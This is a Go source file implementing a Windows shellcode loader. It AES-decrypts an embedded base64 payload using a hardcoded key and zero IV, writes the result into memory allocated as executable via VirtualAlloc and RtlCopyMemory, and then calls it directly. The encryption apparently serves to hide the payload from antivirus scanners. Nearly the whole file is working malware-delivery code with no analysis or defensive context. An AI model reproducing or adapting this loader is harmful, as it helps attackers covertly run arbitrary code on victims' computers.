package tj

import (
	"crypto/aes"
	"crypto/cipher"
	"encoding/base64"
	"fmt"
	"github.com/ha1yu/win-tj-free/utils"
	"log"
	"unsafe"

	//"github.com/ha1yu/tingchao-server/utils"
	"syscall"
)

var iv = "0000000000000000"

func PKCS5UnPadding(origData []byte) []byte {
	length := len(origData)
	unpadding := int(origData[length-1])
	return origData[:(length - unpadding)]
}
func AesDecrypt(decodeStr string, key []byte) ([]byte, error) {
	decodeBytes, err := base64.StdEncoding.DecodeString(decodeStr)
	if err != nil {
		return nil, err
	}
	block, err := aes.NewCipher(key)
	if err != nil {
		return nil, err
	}
	blockMode := cipher.NewCBCDecrypter(block, []byte(iv))
	origData := make([]byte, len(decodeBytes))

	blockMode.CryptBlocks(origData, decodeBytes)
	origData = PKCS5UnPadding(origData)
	return origData, nil
}

func CError(err error) {
	if err != nil {
		fmt.Println(err)
		return
	}
	return
}

const (
	MEM_COMMIT             = 0x1000
	MEM_RESERVE            = 0x2000
	PAGE_EXECUTE_READWRITE = 0x40
	KEY_1                  = 90
	KEY_2                  = 91
)

var (
	kernel32      = syscall.MustLoadDLL("kernel32.dll")
	ntdll         = syscall.MustLoadDLL("ntdll.dll")
	VirtualAlloc  = kernel32.MustFindProc("VirtualAlloc")
	RtlCopyMemory = ntdll.MustFindProc("RtlCopyMemory")
)

func loaderRun() {
	utils.Gotest01()
	shellcodeAesBast64 := "OPQI9JGoMh9g/LTZ9ShH2jXalCpYJxoViYIYgOLN7jUlyqxZK1yGb/tm8dSfkpfAoGmc7Btms/519YS5CquBCebtM76wUS8ahc6hL2lQsxLJnZvIDCnply6UEzv4uaD6lmJapOFSaiTrftm4euGllupnGdqevihQPM34U6Q5tGul0u5O0NVu6iAw+UXAgCFTlGFG68mS4L/moRbHOHkoLccG3t41dyQRQ0xKX+oEO/w6v28I9cIFb26hrj3T5pAST8ZYvNjfLLFhYanGnKZbv9vFSA79iP8asxRVMUS/qdO+Wbnq72CMmDjjCghpeblA8XVRmExNUm4YN7Q9GOp5BMCFkXRERMWoBZks6rZIJKph/Ll089kMCvNmuCkKbmXfQ2nrUUcngeGOqMZ7/4lrxex0xnlzTV+t0upALOISlnSo0QIFJDauXoOcMEM2Uf5UYp75SrOfi3254SsAT74r2ytAxf/gmmTSxG8EPLh1foqiF2TxJHI8DvG6VWrgn25oedUqiz3v3HZc52RcGSpU7fYVQ7NuaevdE9CfKxkQVJorpSR68wkQMcLmr+itKVZne6CGkSVef7c6kZlCXeqqtrcVg76wNM96XtqiAlhuONnhUxJgCjfK8Cc1eSMd+fqcG25VPSbAnmlw2QDAB7rdCo3fgi6qnRrVdnLoEMgsBsNdWoO42fmnNW5ecPI5xnte5y98KY1SWGXyXUpuDikqzngQcTToETVNRvxpkCl6xBhUXkV3N5wxgJ5vMV44RFhoIW077bzJhircsS1w79TSvyIG3iKoqyZeEXreQuInT9O8I7xnN7V3PDHjgpxw3ij6uPvLVUuqMxM18FRE9i4LfszEHEI+OqgdeasRihvaThFVIhESALru/AVEgZIZhsqKZb8G7+a/ejW3xsn76uUg5L5RcA0WEfvbOuxdN7ikbuMzWBzjcHmsFQaEAInNjMSgGwqoEquH4Rb9z78x3UdE9fj7r9BkmvqPvh+nogbHaxF/uRE3BFZgUx35E/Osr5gIpvCWnp8qqCb26D8h0jvYvaR070VDyxbSbWYX13um/7hExCrtuKGGSJtr2SYG0u2D9PuaA5d9Uz13GLnudU2MZX6ea8jbBr3hoz+bqBhApA5JBWfcNj3LUokSlPkcogyjr6YBpBd2Cp7liUsIPV21JZbfKpv2kQwsrGYR8reDkVCbLz8saaaJrx+y328bNLUt+qEMfNVCZihOqSYZx4HL6g=="

	shellcode, _ := AesDecrypt(shellcodeAesBast64, []byte("woshikeywoshikey"))
	addr, _, err := VirtualAlloc.Call(0, uintptr(len(shellcode)), MEM_COMMIT|MEM_RESERVE, PAGE_EXECUTE_READWRITE)
	if err != nil {
		log.Println(err)
		//syscall.Exit(0)
	}
	//if err != nil && err.Error() != "The operation completed successfully." {
	//	syscall.Exit(0)
	//}
	_, _, err = RtlCopyMemory.Call(addr, (uintptr)(unsafe.Pointer(&shellcode[0])), uintptr(len(shellcode)))
	//if err != nil && err.Error() != "The operation completed successfully." {
	//	syscall.Exit(0)
	//}
	if err != nil {
		log.Println(err)
		//syscall.Exit(0)
	}

	syscall.Syscall(addr, 0, 0, 0, 0)
}
